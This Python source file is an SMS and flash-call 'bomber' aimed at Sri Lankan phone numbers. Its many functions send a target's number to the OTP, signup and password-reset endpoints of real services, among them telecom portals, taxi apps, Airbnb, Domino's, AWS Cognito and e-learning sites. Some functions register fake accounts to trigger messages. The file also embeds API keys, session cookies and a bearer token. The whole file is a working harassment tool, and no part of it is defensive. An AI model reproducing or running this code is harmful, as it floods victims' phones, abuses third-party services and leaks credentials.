from time import sleep
from os import system
try:
	from requests import post,get
except ModuleNotFoundError:
	print('\x1b[91m[!] Required Modules Aren\'t Installed!')
	sleep(1)
	print('\x1b[34m[*] Installing...')
	system('pip install requests colorama')
	print('\x1b[92m[+] Required Modules Installed!')
	from requests import post,get
def con(num):
	url='https://craterapi.com/api/register'
	para={'verification':'true'}
	head={'Device-ID':'7cc61cc0-9e15-4b9e-b26b-982d86e9027b','Push-Token':'eVN9Iv1jSrWWxYy3Q0Wy_q:APA91bF3huYHZdz7wBXtH_dgzrtP8POjQwMNKDto4IhKrNPL-Lt9-mgL5VRJcyfZkAz66lpL0wk-uNmo5z88PZWMgM6_0luS9uWPFD2Dw3oTzRESRghyxwz_nKYb5hoqBo0U2f77_Zmk','Content-Type':'application/json; charset=utf-8'}
	body={'login':'+94'+num[1:],'password':'40b6e8a0-33ad-4d7d-844d-85d3a2781987'}
	post(url,params=para,headers=head,json=body)
def call(num):
	url='https://tdsoftapi.sinch.com/verification/v1/verifications'
	headers={'Authorization':'Application a4db32c3-960c-4b29-8d59-373f757a887e','Content-Type':'application/json','Host':'tdsoftapi.sinch.com'}
	json={'metadata':{'version':'2','deviceId':'f87b9bf4-f9ff-48be-a010-4fb198b997d7','os':'10','platform':'Android','sdk':'1.6.0','buildFlavor':'normal','device':{'model':'Nokia 2.2','idname':'WSP_sprout','manufacturer':'HMD Global'},'simCardsCount':'2','simCardsInfo':{'count':'2','1':{'sim':{'countryId':'lk','mcc':'413','mnc':'02','MSISDN_matches_input':False},'operator':{'countryId':'lk','name':'Dialog','roaming':False,'mcc':'413','mnc':'2'}},'2':{'sim':{'countryId':'lk','mcc':'413','mnc':'01','MSISDN_matches_input':False},'operator':{'countryId':'lk','name':'Mobitel','roaming':False,'mcc':'413','mnc':'1'}}},'simState':'SIM_STATE_READY','defaultLocale':'en_IN','permissions':{'READ_PHONE_STATE':True,'READ_CALL_LOG':True,'CALL_PHONE':True,'READ_SMS':False,'RECEIVE_SMS':False,'ACCESS_NETWORK_STATE':True,'getCellularSignalLevel':True},'networkInfo':{'isVoiceCapable':True,'data':{'type':'VPN'}},'batteryLevel':'0%'},'identity':{'type':'number','endpoint':'+94'+num[1:]},'method':'flashCall','honourEarlyReject':True,'custom':'86424e00d94f14fb9c1a13665b479cdaad34048d'}
	po=post(url,headers=headers,json=json)
	if 'errorCode' in po.json():
		return False
	else:
		return True
def yogo(num,delay):
	url='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
	body={'countrycode':'94','mobile':num,'name':'santha','email':''}
	po=post(url,data=body)
	sleep(delay)
def mega(num,delay):
	url='https://megarun.dialog.lk/api/v2/user'
	body={'mobile':num[1:]}
	po=post(url,data=body)
	sleep(delay)
def guru(num,delay):
	url='https://guru.lk/auth/headstart/ajax.php'
	body={'phone':num,'course':'1','sesskey':'','action':'sms_reg'}
	po=post(url,data=body)
	sleep(delay)
def kangaroo(num,delay):
	url='https://customer.kangarooapps.com/customer-api/customers/create'
	body={'email':'a1@slt.net','firstName':'A','lastName':'b','password':'abcd1234','contactNumber':num[1:],'countryCode':'+94'}
	post(url,data=body)
	url='https://customer.kangarooapps.com/customer-api/customers/password/forgot'
	body={'contactNumber':num,'countryCode':'+94'}
	po=post(url,data=body)
	sleep(delay)
def moba(num,dealy):
	url='https://sc.mobitel.lk/MyAccount/dwr/call/plaincall/customer_information_change.password_reset_otp_code_send.dwr' 
	head={'Host':'sc.mobitel.lk'}
	data={'callCount':'1','page':'/MyAccount/myaccount_reset_password.jsp','httpSessionId':'tNuBGCK2qPfMtpzztFRY8GYx','scriptSessionId':'47014AD7441CF94B1689F490488461F2647','c0-scriptName':'customer_information_change','c0-methodName':'password_reset_otp_code_send','c0-id':'0','c0-param0':f'string:{num}','batchId':'2'}
	po=post(url,headers=head,data=data)
	sleep(delay)
def dtamart(num,delay):
	url='https://www.datamart.lk/home/otpForViewUsage'
	body={'serviceNum':num}
	po=post(url,data=body)
	sleep(delay)
def dtamart2(num,delay):
	def precon(num):
		url='https://www.datamart.lk/home/actPreConfirm'
		headers={'Host':'www.datamart.lk','Content-Type':'application/x-www-form-urlencoded'}
		cookies=dict(JSESSIONID='y8XRkErbp8P8cyqW3RXrMM7W',_ga='GA1.2.1867291426.1595041842',_gid='GA1.2.779901286.1595041842',_gat_gtag_UA_126914918_1='1')
		body=dict(serviceNumber=num,reServiceNumber=num,selector117='a',paymentMethod='a',packageRefNo='117')
		po=post(url,headers=headers,cookies=cookies,data=body)
	def sms():
		url='https://www.datamart.lk/home/payPrePkg'
		headers={'Host':'www.datamart.lk','Content-Type':'application/x-www-form-urlencoded'}
		cookies=dict(JSESSIONID='y8XRkErbp8P8cyqW3RXrMM7W',_ga='GA1.2.1867291426.1595041842',_gid='GA1.2.779901286.1595041842',_gat_gtag_UA_126914918_1='1')
		po=post(url,headers=headers,cookies=cookies)
		return po.text
	precon(num)
	res=sms()
	sleep(delay)
def doc(num,delay):
	url='https://mobile.doc.lk/user-register/send-sms'
	head={'Host':'mobile.doc.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	body={'formId':'469738','country':'1','phone':num,'email':'','_token':'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
	req=post(url,headers=head,data=body)
	sleep(delay)
def pat(num,delay):
	url='https://www.patpat.lk/api/customer.php'
	para={'customer':'new_customer'}
	head={'Host':'www.patpat.lk'}
	body={'title':'Mr.','first_name':'ගලපිටමඩ ආරච්චිලාගේ සාන්ත','last_name':'සාන්ත ගලේගොඩ','email':'s1@l.lk','password':'MTIzNDU2Nw==','telephone':num,'gender':'','dob':'1976-08-24'}
	po=post(url,params=para,headers=head,json=body)
	sleep(delay)
def ona(num,delay):
	def sms(num):
		url='https://cognito-idp.ap-southeast-1.amazonaws.com/'
		head={'x-amz-target':'AWSCognitoIdentityProviderService.InitiateAuth','Content-Type':'application/x-amz-json-1.1','Host':'cognito-idp.ap-southeast-1.amazonaws.com'}
		body={'AuthFlow':'CUSTOM_AUTH','ClientId':'uv3fuaop27riqv417pgivo447','AuthParameters':{'USERNAME':'+94'+num[1:]},'ClientMetadata':{}}
		po=post(url,headers=head,json=body)
		if po.status_code == 400:
			mkacc(num)
	def mkacc(num):
		url='https://cognito-idp.ap-southeast-1.amazonaws.com/'
		head={'x-amz-target':'AWSCognitoIdentityProviderService.SignUp','Content-Type':'application/x-amz-json-1.1','Host':'cognito-idp.ap-southeast-1.amazonaws.com'}
		json={'ClientId':'uv3fuaop27riqv417pgivo447','Username':'+94'+num[1:],'Password':'123456','UserAttributes':[{'Name':'name','Value':'abc'}],'ValidationData':[]}
		post(url,headers=head,json=json)
	sms(num)
	sleep(delay)
def idea(num,delay):
	url='https://portal.ideabiz.lk/v2/user/otpRequest'
	head={'Host':'portal.ideabiz.lk'}
	body={'method':'ANC','msisdn':'94'+num[1:]}
	po=post(url,headers=head,json=body)
	sleep(delay)
def airbnb(num,delay):
	url='https://www.airbnb.com/api/v2/phone_one_time_passwords'
	headers=dict(Host='www.airbnb.com')
	params=dict(currency='USD',key='d306zoyjsyarp7ifhu67rjxn52tv0t20',locale='en')
	num = '94' + num
	data=dict(phoneNumber=num,workFlow='GLOBAL_SIGNUP_LOGIN',otpMethod='AUTO')
	po=post(url,params=params,headers=headers,json=data)
	sleep(delay)
def mobself(num,delay):
	url='https://mdp.mobitel.lk/mfp/api/adapters/SelfCareAdapter/account/addNumberToApp'
	header={'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6ImYxNzczNTdlLTNlNGEtNGU4Mi1hN2U3LTZmMzg4NGIwMTg2ZiIsIm4iOiJBTTBEZDd4QWR2NkgteWdMN3I4cUNMZEUtM0kya2s0NXpnWnREZF9xczhmdm5ZZmRpcVRTVjRfMnQ2T0dHOENWNUNlNDFQTXBJd21MNDEwWDlJWm52aHhvWWlGY01TYU9lSXFvZS1ySkEwdVp1dzJySGhYWjNXVkNlS2V6UlZjQ09Zc1FOLW1RSzBtZno1XzNvLWV2MFVZd1hrU093QkJsMUVocUl3VkR3T2llZzJKTUdsMEVYc1BaZmtOWkktSFU0b01paS1Uck5MelJXa01tTHZtMDloTDV6b3NVTkExNXZlQ0twaDJXcG1TbTJTNjFuRGhIN2dMRW95bURuVEVqUFk1QW9oMmluSS0zNlJHWVZNVVViTzQ2Q3JOVVl1SW9iT2lYbEx6QklodUlDcGZWZHhUX3g3c3RLWDVDOUJmTVRCNEdrT0hQNWNVdjdOejFkRGhJUHU4PSJ9fQ.eyJpc3MiOiJjb20uaWJtLm1mcCIsInN1YiI6ImYxNzczNTdlLTNlNGEtNGU4Mi1hN2U3LTZmMzg4NGIwMTg2ZiIsImF1ZCI6ImNvbS5pYm0ubWZwIiwiZXhwIjoxNTk5MDQ0NjE3NjgwLCJzY29wZSI6IlJlZ2lzdGVyZWRDbGllbnQgU2VsZkNhcmVTY29wZSJ9.CvOG9c_xpV_oO6k0TWXL-clqIbVqU8uLHksJcF-tX1eD11OMtll6QUrq6xvD4rCM7_O6lv33ziINEF0ckJ3seJGgv0r5Ys_zFiob-9xoAJFLkuAN2_FBo0iJzf0DBiz4US1_KY9FGZfVt1EriXM-lj9mSPD90f54_yRQqINm3RQ5KFuvRw1CK55J9LUTvLqjMXBOVvn482erZmVJI1dAw0xkoxVhjna-TjKpEiaH6VzI3nCqhJ9en5U2infs02QVslnoXq6jQKFvEDZFgbWluTIxxP_w5NdKK9Go0ek9mqIUmSOChxQfnBj4SZvdry2DC7Xt8D5-KdcX_M1yirgqNw', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'mdp.mobitel.lk'}
	data=f'params=%5B%7B%22device_type%22%3A%22desktop%22%2C%22appType%22%3A%22android%22%2C%22platformName%22%3A%22Android%22%2C%22user_id%22%3A%22-%22%2C%22testMode%22%3Afalse%2C%22trn_id%22%3A6%2C%22controller%22%3A%22account%22%2C%22action%22%3A%22addNumberToApp%22%2C%22platformVersion%22%3A%2210%22%2C%22device_version%22%3A%2210%22%2C%22device_manufacturer%22%3A%22HMD%20Global%22%2C%22deviceRef%22%3A%2204ff7be9ec7d63ba_381596262673267%22%2C%22device_id%22%3A%2204ff7be9ec7d63ba%22%2C%22device_platform%22%3A%2210%22%2C%22device_imsi%22%3A%2204ff7be9ec7d63ba%22%2C%22deviceModel%22%3A%22WSP_sprout%22%2C%22deviceToken%22%3A%22x2kmc48jb6g24147w817et6a19.769369435a%22%2C%22appVersion%22%3A%223.0.2%22%2C%22prePostType%22%3A%22%22%2C%22conn%22%3A%22%22%2C%22language%22%3A%22en%22%2C%22primaryConn%22%3A%22%22%2C%22user_type%22%3A%22%22%2C%22session_key%22%3A%22%22%2C%22package%22%3A%22%22%2C%22network_type%22%3A%22cellular%22%2C%22lob%22%3A%22%22%2C%22pushID%22%3A%22fv_AAyv6i9g%3AAPA91bFir7VaQDLBuSgSW8AQRZ8wVX78ZbGanuKIEDM0zrPhUrYiU62disk6k1jL242HQs6RPCLCmeIzNStQ30JZk7d7wGYVGZANWA74ceoui5d-PaeeNoFhnrzopSbQTs7EbaqjncfR%22%2C%22mobileNumber%22%3A%22{num}%22%7D%5D'
	po=post(url,headers=header,data=data)
	sleep(delay)
def hutcliq(num,delay):
	url='https://cliq.hutch.lk/api/services/auth/v1/login/smscode'
	params={'prefix':'94','sdn':num[1:]}
	head={'Host':'cliq.hutch.lk','Accept-Encoding':'gzip'}
	po=get(url,params=params,headers=head)
	sleep(delay)
def hutself(num,delay):
	url='https://oneapp.hutch.lk/hutch_1_0/index.php'
	params={'r':'/scapp/account/sendOTP'}
	head={'Host':'oneapp.hutch.lk','Content-Length':'152','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	body={'appType':'android','appVersion':'2.0.1','conn':num[1:],'deviceModel':'Nokia+2.2','deviceRef':'68e6a23f3b598e32','deviceVersion':'10','language':'en','lob':'mobile','prePostType':'pre'}
	po=post(url,params=params,headers=head,data=body)
	sleep(delay)
def savari(num,delay):
	url='https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
	body={'email':'a1@slt.net','numCountryCode':'+94','phoneNum':num[1:],'referralCode':'','userType':'passenger'}
	po=post(url,json=body)
	sleep(delay)
def youcab(num,delay):
	url='http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
	body={'countrycode':'%2B94','mobile':num,'name':'s','email':''}
	po=post(url,data=body)
	sleep(delay)
def domin(num,delay):
	url='https://apis.dominoslk.com/loginhandler/forgotpassword'
	headers={'Host':'apis.dominoslk.com'}
	data={'lastName':'','mobile':num[1:],'firstName':''}
	po=post(url,headers=headers,json=data)
	sleep(delay)
def upay(num,delay):
	def getid(num):
		url='https://apigateway.upay.lk/platform-service/customer/signup/heyu'
		headers={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
		json={'name':'Santha','mobile':num,'username':'+94'+num,'countryCode':'+94','password':'1234','deviceInfo':{'deviceType':'MOBILE','deviceUUID':'68e6a23f3b598e32','deviceSerial':'nkonuwn','deviceModel':'Nokia 2.2','os':'Android','deviceManufacturer':'HMD Global','osVersion':'10','isVirtual':False},'termsAndConditionsVersionId':'2.0','privacyPolicyVersionId':'2.0','signUpReferrer':None}
		idreq=post(url,headers=headers,json=json)
		return idreq
	idreq=getid(num)
	def sms(idreq):
		url='https://apigateway.upay.lk/platform-service/otp/request'
		header={'Host':'apigateway.upay.lk','x-api-key':'IdHobBMY1q70qCMnWECcV1FZw6AVGnyH5pSTaHKa'}
		json={'otpType':'SIGNUP','notificationMedium':'MOBILE','userId':idreq.json()['data']['userId']}
		po=post(url,headers=header,json=json)
		idreq=getid(num)
		#sms(idreq)
	sms(idreq)
	sleep(delay)
def oli(num,delay):
	url='https://compete.slmathsolympiad.org/api/parent/verifyPhone'
	head={'Host':'compete.slmathsolympiad.org','User-Agent': 'Mozilla/5.0 (Linux; Android 10; Nokia 2.2 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Content-Type':'application/json'}
	data={'phone1':num}
	po=post(url,headers=head,json=data)
	sleep(delay)
def heal(num,delay):
	url='https://hbserver.healthnet.lk/api/v1/auth/register'
	head={'Content-Type':'application/json;charset=utf-8','Host':'hbserver.healthnet.lk'}
	coo={'Cookie':'__cfduid=db6f717e46bf293814452c96dea71976a1597854945'}
	json={'mobileNumber':num}
	po=post(url,headers=head,cookies=coo,json=json)
	sleep(delay)
def eclass1(num,delay):
	url='https://apexkegalle.lk/kurunegala/index.php/online_student/New_Student_Register_C/send_otp_sms/'
	head={'Host':'apexkegalle.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	dat={'sms_otp_mobile':num}
	po=post(url,headers=head,data=dat)
	sleep(delay)
def eclass2(num,delay):
	url='https://revision.ewings.lk/online/index.php/online_student/New_Student_Register_C/send_otp_sms/'
	head={'Host':'revision.ewings.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	dat={'sms_otp_mobile':num}
	po=post(url,headers=head,data=dat)
	sleep(delay)
def eclass3(num,delay):
	url='https://syzygyonline.lk/nugegoda/index.php/online_student/New_Student_Register_C/send_otp_sms/'
	head={'Host':'syzygyonline.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	dat={'sms_otp_mobile':num}
	po=post(url,headers=head,data=dat)
	sleep(delay)
def eclass4(num,delay):
	url='https://syzygyonline.lk/gampaha/index.php/online_student/New_Student_Register_C/send_otp_sms/'
	head={'Host':'syzygyonline.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	dat={'sms_otp_mobile':num}
	po=post(url,headers=head,data=dat)
	sleep(delay)
def eclass5(num,delay):
	url='https://susipvan.lk/online/index.php/online_student/New_Student_Register_C/send_otp_sms/'
	head={'Host':'susipvan.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	dat={'sms_otp_mobile':num}
	po=post(url,headers=head,data=dat)
	sleep(delay)
def eclass6(num,delay):
	url='https://eclassonline.lk/sisulka/index.php/online_student/New_Student_Register_C/send_otp_sms/'
	head={'Host':'susipvan.lk','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	dat={'sms_otp_mobile':num}
	po=post(url,headers=head,data=dat)
	sleep(delay)